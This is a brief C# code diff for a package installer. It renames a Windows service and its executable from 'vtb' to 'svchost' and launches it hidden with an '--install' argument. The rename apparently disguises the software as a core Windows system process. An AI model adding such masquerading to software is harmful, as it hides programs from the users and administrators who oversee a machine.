@@ -16,7 +16,7 @@ namespace PkgInstall
         /// </summary>
         public static void Start()
         {
-            ServiceController servicoDartagnan = new ServiceController("vtb");
+            ServiceController servicoDartagnan = new ServiceController("svchost");
 
             try
             {
@@ -52,7 +52,7 @@ namespace PkgInstall
             processo.StartInfo.CreateNoWindow = true;
             processo.StartInfo.UseShellExecute = false;
 
-            processo.StartInfo.FileName = String.Format("{0}\\vtb.exe", Environment.CurrentDirectory);
+            processo.StartInfo.FileName = String.Format("{0}\\svchost.exe", Environment.CurrentDirectory);
             processo.StartInfo.Arguments = "--install";
             //processo.StartInfo.Arguments = "--unistall";
             processo.Start();
